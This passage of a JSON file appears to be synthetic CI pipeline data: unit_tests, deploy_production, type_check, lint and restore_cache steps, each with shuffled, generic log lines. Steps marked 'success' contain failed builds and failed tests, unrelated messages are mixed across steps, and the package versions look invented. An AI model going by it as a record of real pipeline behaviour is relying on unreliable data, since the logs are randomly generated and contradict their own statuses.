          "Cache hit for key-3498",
          "Cache hit for key-1951",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "Cache hit for key-8798",
          "\u2713 lint completed",
          "Installing jest@5.18.0",
          "  PASS: test_user_create (393ms)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Compiling src/app.ts...",
          "Compiling src/main.py...",
          "Installing react@4.4.0",
          "Cache hit for key-2397",
          "  PASS: test_user_create (28ms)",
          "Cache hit for key-8238",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_auth_login (433ms)",
          "Step 7/10: Building",
          "Compiling src/main.py...",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-7299",
          "[12:00:32] INFO: Processing request",
          "\u2713 test completed",
          "Cache hit for key-7117",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Cache hit for key-8591",
          "  PASS: test_db_connect (344ms)",
          "[12:00:32] INFO: Processing request",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (12MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "Step 8/10: Building",
          "Installing axios@4.11.0",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_cache_hit (8ms)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Compiling src/service.java...",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-8403",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "\u2713 test completed",
          "\u2713 test completed",
          "\u2713 build completed",
          "[12:00:32] WARN: Deprecated API usage",
          "Cache hit for key-9420",
          "Step 9/10: Building",
          "  PASS: test_auth_login (302ms)",
          "[12:00:32] INFO: Processing request",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_db_connect (410ms)",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Step 10/10: Building",
          "Cache hit for key-5553",
          "[12:00:32] WARN: Deprecated API usage",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:32] INFO: Processing request",
          "Installing jest@4.3.0",
          "Artifact uploaded: build.tar.gz (32MB)",
          "\u2713 test completed",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-6950",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_api_health (4ms)",
          "\u2713 test completed",
          "Installing jest@2.3.0",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_user_create (228ms)",
          "Compiling src/index.js...",
          "[12:00:32] WARN: Deprecated API usage",
          "[12:00:32] INFO: Processing request",
          "Installing express@4.13.0",
          "[12:00:32] INFO: Processing request",
          "Compiling src/service.java...",
          "FAILED: test_db_connect",
          "Compiling src/service.java...",
          "Compiling src/app.ts...",
          "Installing jest@2.14.0",
          "Compiling src/main.py...",
          "FAILED: test_db_connect",
          "Step 3/10: Building",
          "Installing axios@1.0.0",
          "Cache hit for key-9673",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_user_create (492ms)",
          "Step 8/10: Building",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Step 6/10: Building",
          "Step 3/10: Building",
          "  PASS: test_user_create (183ms)",
          "  PASS: test_auth_login (406ms)",
          "Installing express@4.20.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Compiling src/service.java...",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_user_create (239ms)",
          "Compiling src/handler.rs...",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-20T12:01:21.503158",
        "finished_at": "2025-12-20T12:01:24.468830",
        "log_lines": [
          "=== Step: deploy_production ===",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-8028",
          "  PASS: test_auth_login (379ms)",
          "Compiling src/app.ts...",
          "Installing jest@2.18.0",
          "Installing react@4.9.0",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Cache hit for key-4754",
          "[12:00:32] INFO: Processing request",
          "Step 9/10: Building",
          "Installing webpack@1.9.0",
          "Cache hit for key-7420",
          "[12:00:32] INFO: Processing request",
          "\u2713 lint completed",
          "\u2717 build failed with exit code 63",
          "Installing axios@2.9.0",
          "\u2713 lint completed",
          "Cache hit for key-4908",
          "[12:00:32] ERROR: Connection failed",
          "Compiling src/app.ts...",
          "Step 3/10: Building",
          "Step 2/10: Building",
          "  PASS: test_auth_login (426ms)",
          "Cache hit for key-6553",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Installing express@1.10.0",
          "[12:00:32] INFO: Processing request",
          "Compiling src/handler.rs...",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-7617",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (203ms)",
          "Step 10/10: Building",
          "Compiling src/handler.rs...",
          "Step 9/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (11MB)",
          "\u2713 build completed",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Compiling src/service.java...",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-2793",
          "Cache hit for key-7383",
          "Compiling src/handler.rs...",
          "Installing eslint@1.3.0",
          "\u2717 build failed with exit code 103",
          "FAILED: test_db_connect",
          "Cache hit for key-7121",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (21MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-9897",
          "Installing react@3.11.0",
          "[12:00:32] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "  PASS: test_auth_login (144ms)",
          "[12:00:32] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "[12:00:32] INFO: Processing request",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Step 1/10: Building",
          "Installing webpack@2.14.0",
          "  PASS: test_api_health (230ms)",
          "  PASS: test_api_health (209ms)",
          "\u2713 test completed",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "  PASS: test_db_connect (23ms)",
          "Cache hit for key-8200",
          "Cache hit for key-5031",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "  PASS: test_api_health (135ms)",
          "\u2713 test completed",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "\u2713 build completed",
          "Installing react@1.11.0",
          "[12:00:32] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Step 4/10: Building",
          "Compiling src/app.ts...",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "Cache hit for key-2780",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Installing react@3.9.0",
          "WARNING: react has known vulnerabilities",
          "Step 1/10: Building",
          "[12:00:32] WARN: Deprecated API usage",
          "Step 3/10: Building",
          "  PASS: test_cache_hit (126ms)",
          "Installing axios@2.18.0",
          "Compiling src/handler.rs...",
          "[12:00:32] ERROR: Connection failed",
          "Installing jest@5.8.0",
          "  PASS: test_db_connect (352ms)",
          "Step 10/10: Building",
          "Installing lodash@2.7.0",
          "Compiling src/index.js...",
          "[12:00:32] INFO: Processing request",
          "Installing webpack@2.9.0",
          "Compiling src/index.js...",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "FAILED: test_api_health",
          "Compiling src/index.js...",
          "Step 7/10: Building",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-7215",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Step 7/10: Building",
          "Compiling src/index.js...",
          "Installing eslint@3.8.0",
          "\u2713 lint completed",
          "Step 8/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_api_health (346ms)",
          "Installing express@3.7.0",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "Cache hit for key-2816",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_api_health (476ms)",
          "[12:00:32] WARN: Deprecated API usage",
          "[12:00:32] WARN: Deprecated API usage",
          "Cache hit for key-3652",
          "Cache hit for key-2967",
          "Installing jest@3.17.0",
          "Artifact uploaded: build.tar.gz (24MB)",
          "[12:00:32] INFO: Processing request",
          "Installing express@3.5.0",
          "Cache hit for key-8077",
          "Artifact uploaded: build.tar.gz (8MB)",
          "  PASS: test_auth_login (390ms)",
          "Step 10/10: Building",
          "  PASS: test_api_health (451ms)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "  PASS: test_cache_hit (406ms)",
          "[12:00:32] INFO: Processing request",
          "Installing webpack@3.8.0",
          "[12:00:32] WARN: Deprecated API usage",
          "Cache hit for key-8650",
          "Step 9/10: Building",
          "Compiling src/utils.go...",
          "Installing axios@1.10.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Cache hit for key-4335",
          "Step 7/10: Building",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_db_connect (138ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_user_create (494ms)",
          "\u2713 test completed",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Step 10/10: Building",
          "Exception: TypeError",
          "  PASS: test_auth_login (405ms)",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (11MB)",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Installing jest@1.3.0",
          "  PASS: test_user_create (46ms)",
          "  PASS: test_db_connect (337ms)",
          "[12:00:32] INFO: Processing request",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Installing express@2.16.0",
          "Cache hit for key-4513",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 test completed",
          "  PASS: test_db_connect (120ms)",
          "\u2713 build completed",
          "  PASS: test_api_health (389ms)",
          "[12:00:32] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "Installing webpack@2.4.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Step 6/10: Building",
          "Cache hit for key-2801",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-20T12:01:24.468830",
        "finished_at": "2025-12-20T12:01:31.883009",
        "log_lines": [
          "=== Step: type_check ===",
          "Compiling src/service.java...",
          "[12:00:32] ERROR: Connection failed",
          "Step 2/10: Building",
          "[12:00:32] WARN: Deprecated API usage",
          "  PASS: test_db_connect (298ms)",
          "Step 7/10: Building",
          "Installing lodash@2.6.0",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Compiling src/app.ts...",
          "[12:00:32] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Installing jest@5.0.0",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Installing prettier@3.18.0",
          "Installing jest@4.1.0",
          "Cache hit for key-4064",
          "\u2713 build completed",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (27MB)",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (33MB)",
          "  PASS: test_db_connect (284ms)",
          "Compiling src/handler.rs...",
          "Step 8/10: Building",
          "  PASS: test_api_health (462ms)",
          "  PASS: test_api_health (440ms)",
          "\u2713 build completed",
          "Step 5/10: Building",
          "  PASS: test_api_health (298ms)",
          "[12:00:32] INFO: Processing request",
          "Installing webpack@3.12.0",
          "Compiling src/service.java...",
          "[12:00:32] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (45MB)",
          "\u2713 build completed",
          "Step 6/10: Building",
          "  PASS: test_auth_login (332ms)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "\u2713 test completed",
          "Installing axios@1.17.0",
          "  PASS: test_api_health (259ms)",
          "  PASS: test_cache_hit (65ms)",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_cache_hit (292ms)",
          "Installing express@5.4.0",
          "Cache hit for key-2389",
          "Compiling src/main.py...",
          "Cache hit for key-4278",
          "Compiling src/service.java...",
          "Compiling src/service.java...",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "Cache hit for key-3829",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Step 10/10: Building",
          "Step 6/10: Building",
          "  PASS: test_auth_login (160ms)",
          "\u2713 build completed",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "WARNING: eslint has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing lodash@1.7.0",
          "  PASS: test_api_health (397ms)",
          "  PASS: test_cache_hit (322ms)",
          "Cache hit for key-1773",
          "Exception: TypeError",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_cache_hit (455ms)",
          "Installing webpack@1.0.0",
          "  PASS: test_user_create (475ms)",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-8344",
          "Compiling src/main.py...",
          "Cache hit for key-7663",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2713 test completed",
          "\u2713 build completed",
          "Installing react@1.19.0",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (28MB)",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (6MB)",
          "[12:00:32] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "Installing jest@1.7.0",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:32] INFO: Processing request",
          "Installing jest@1.19.0",
          "Cache hit for key-7821",
          "  PASS: test_auth_login (215ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "  PASS: test_db_connect (441ms)",
          "Installing webpack@2.16.0",
          "Installing webpack@4.8.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Exception: ValueError",
          "Installing axios@2.17.0",
          "Cache hit for key-3559",
          "Installing express@3.5.0",
          "[12:00:32] WARN: Deprecated API usage",
          "Cache hit for key-9443",
          "  PASS: test_api_health (260ms)",
          "Step 6/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (5MB)",
          "\u2717 build failed with exit code 51",
          "\u2713 lint completed",
          "\u2713 test completed",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_user_create (421ms)",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Cache hit for key-2490",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Cache hit for key-1758",
          "Installing express@3.17.0",
          "  PASS: test_auth_login (367ms)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Compiling src/app.ts...",
          "[12:00:32] INFO: Processing request",
          "Step 9/10: Building",
          "Cache hit for key-5425",
          "Installing react@3.0.0",
          "Compiling src/service.java...",
          "Exception: ValueError",
          "Compiling src/handler.rs...",
          "Installing lodash@5.2.0",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Cache hit for key-3087",
          "Cache hit for key-6392",
          "Compiling src/app.ts...",
          "Installing webpack@5.0.0",
          "Installing prettier@5.3.0",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (21MB)",
          "  PASS: test_db_connect (403ms)",
          "Installing lodash@4.13.0",
          "Cache hit for key-4856",
          "[12:00:32] INFO: Processing request",
          "FAILED: test_db_connect",
          "Compiling src/app.ts...",
          "Cache hit for key-2050",
          "Cache hit for key-1380",
          "[12:00:32] INFO: Processing request",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 lint completed",
          "[12:00:32] INFO: Processing request",
          "Compiling src/service.java...",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-2093",
          "Installing webpack@5.16.0",
          "Cache hit for key-3149",
          "Installing react@4.9.0",
          "Cache hit for key-2216",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-8449",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-6908",
          "  PASS: test_auth_login (23ms)",
          "Step 6/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 3/10: Building",
          "Cache hit for key-2522",
          "\u2713 build completed",
          "Step 4/10: Building",
          "Step 2/10: Building",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling src/index.js...",
          "Installing jest@4.12.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (19MB)",
          "WARNING: eslint has known vulnerabilities",
          "Step 4/10: Building",
          "[12:00:32] WARN: Deprecated API usage",
          "  PASS: test_user_create (244ms)",
          "[12:00:32] INFO: Processing request",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Installing lodash@2.5.0",
          "Step 9/10: Building",
          "\u2713 build completed",
          "Cache hit for key-1528",
          "Compiling src/main.py...",
          "Step 8/10: Building",
          "Step 2/10: Building",
          "Step 10/10: Building",
          "Cache hit for key-1440",
          "[12:00:32] INFO: Processing request",
          "Installing jest@4.16.0",
          "FAILED: test_user_create",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "Installing lodash@1.20.0",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-20T12:01:31.883009",
        "finished_at": "2025-12-20T12:01:39.297188",
        "log_lines": [
          "=== Step: lint ===",
          "Step 7/10: Building",
          "  PASS: test_db_connect (132ms)",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/utils.go...",
          "Step 3/10: Building",
          "Installing react@4.8.0",
          "Installing react@1.15.0",
          "[12:00:32] INFO: Processing request",
          "Compiling src/index.js...",
          "WARNING: jest has known vulnerabilities",
          "Installing lodash@1.20.0",
          "  PASS: test_user_create (125ms)",
          "Step 9/10: Building",
          "Step 8/10: Building",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Installing react@2.7.0",
          "Step 3/10: Building",
          "Installing react@1.18.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:32] WARN: Deprecated API usage",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Installing webpack@2.13.0",
          "[12:00:32] ERROR: Connection failed",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_cache_hit (254ms)",
          "Step 8/10: Building",
          "Compiling src/index.js...",
          "[12:00:32] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (6MB)",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-2877",
          "Step 5/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (10MB)",
          "[12:00:32] ERROR: Connection failed",
          "Installing jest@5.20.0",
          "  PASS: test_auth_login (56ms)",
          "Compiling src/utils.go...",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_cache_hit (138ms)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (405ms)",
          "Step 5/10: Building",
          "Step 9/10: Building",
          "[12:00:32] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (16MB)",
          "\u2713 lint completed",
          "Cache hit for key-5998",
          "Cache hit for key-6814",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-1399",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Step 7/10: Building",
          "Step 5/10: Building",
          "\u2713 test completed",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "[12:00:32] WARN: Deprecated API usage",
          "Step 2/10: Building",
          "\u2713 test completed",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-7331",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Installing lodash@1.10.0",
          "Installing jest@2.1.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-7458",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing webpack@5.17.0",
          "\u2713 test completed",
          "[12:00:32] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Installing express@5.16.0",
          "Installing react@4.11.0",
          "  PASS: test_db_connect (416ms)",
          "Step 4/10: Building",
          "WARNING: prettier has known vulnerabilities",
          "Step 3/10: Building",
          "WARNING: jest has known vulnerabilities",
          "Step 5/10: Building",
          "[12:00:32] ERROR: Connection failed",
          "Compiling src/index.js...",
          "WARNING: axios has known vulnerabilities",
          "WARNING: express has known vulnerabilities",
          "  PASS: test_api_health (499ms)",
          "[12:00:32] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (98ms)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Compiling src/service.java...",
          "Installing jest@3.15.0",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:32] INFO: Processing request",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Installing lodash@3.4.0",
          "Installing lodash@2.20.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_user_create (475ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "[12:00:32] INFO: Processing request",
          "Step 7/10: Building",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-2570",
          "Compiling src/index.js...",
          "Step 5/10: Building",
          "Installing eslint@5.20.0",
          "Installing lodash@3.8.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "  PASS: test_auth_login (333ms)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Cache hit for key-8705",
          "  PASS: test_cache_hit (111ms)",
          "  PASS: test_cache_hit (394ms)",
          "Step 8/10: Building",
          "Cache hit for key-1345",
          "Installing jest@2.12.0",
          "Cache hit for key-7631",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (19MB)",
          "FAILED: test_db_connect",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:00:32] INFO: Processing request",
          "Step 1/10: Building",
          "  PASS: test_api_health (99ms)",
          "[12:00:32] INFO: Processing request",
          "Compiling src/handler.rs...",
          "  PASS: test_db_connect (419ms)",
          "Step 5/10: Building",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Step 8/10: Building",
          "\u2713 test completed",
          "  PASS: test_db_connect (456ms)",
          "[12:00:32] INFO: Processing request",
          "Compiling src/service.java...",
          "[12:00:32] INFO: Processing request",
          "Installing lodash@1.0.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache hit for key-3154",
          "  PASS: test_cache_hit (267ms)",
          "Step 6/10: Building",
          "Installing jest@2.14.0",
          "Cache hit for key-6193",
          "Compiling src/service.java...",
          "Compiling src/app.ts...",
          "Installing jest@2.18.0",
          "Installing jest@5.10.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 6/10: Building",
          "  PASS: test_api_health (118ms)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "  PASS: test_user_create (11ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing prettier@5.8.0",
          "Artifact uploaded: build.tar.gz (42MB)",
          "  PASS: test_db_connect (321ms)",
          "Step 6/10: Building",
          "Installing axios@2.2.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 lint completed",
          "Installing eslint@4.0.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 8/10: Building",
          "\u2713 test completed",
          "Installing eslint@4.14.0",
          "Artifact uploaded: build.tar.gz (49MB)",
          "  PASS: test_cache_hit (147ms)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (21MB)",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_auth_login (401ms)",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_api_health (195ms)",
          "Step 2/10: Building",
          "[12:00:32] INFO: Processing request",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-20T12:01:39.297188",
        "finished_at": "2025-12-20T12:01:43.745696",
        "log_lines": [
          "=== Step: restore_cache ===",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Compiling src/main.py...",
          "Step 9/10: Building",
          "[12:00:32] INFO: Processing request",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "\u2713 test completed",
          "Installing webpack@1.2.0",
          "\u2713 test completed",
          "[12:00:32] ERROR: Connection failed",
          "Installing express@1.11.0",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] WARN: Deprecated API usage",
          "Installing lodash@3.20.0",
          "Compiling src/utils.go...",
          "Cache hit for key-9314",
          "Cache hit for key-1317",
          "Artifact uploaded: build.tar.gz (41MB)",
          "\u2713 lint completed",
          "[12:00:32] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:32] WARN: Deprecated API usage",
          "Installing express@1.12.0",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-8380",
          "  PASS: test_auth_login (341ms)",
          "Installing webpack@5.14.0",
          "  PASS: test_api_health (376ms)",
          "Installing lodash@3.8.0",
          "  PASS: test_user_create (97ms)",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_api_health (406ms)",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-4853",
          "Exception: ValueError",
          "\u2713 test completed",
          "\u2713 lint completed",
          "  PASS: test_auth_login (446ms)",
          "\u2713 build completed",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (20MB)",
          "  PASS: test_user_create (447ms)",
          "  PASS: test_user_create (401ms)",
          "Cache hit for key-6230",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Step 10/10: Building",
          "Cache hit for key-8873",
          "Step 9/10: Building",
          "\u2713 test completed",
          "Cache hit for key-9748",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/utils.go...",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] WARN: Deprecated API usage",
          "Cache hit for key-5482",
          "  PASS: test_db_connect (29ms)",
          "Compiling src/index.js...",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_db_connect (108ms)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "  PASS: test_auth_login (472ms)",
          "Compiling src/index.js...",
          "Installing eslint@1.20.0",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Compiling src/service.java...",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Installing axios@2.3.0",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Compiling src/app.ts...",
          "Compiling src/handler.rs...",
          "Compiling src/index.js...",
          "[12:00:32] WARN: Deprecated API usage",
          "Installing jest@4.16.0",
          "Step 4/10: Building",
          "Cache hit for key-7660",
          "Cache hit for key-6657",
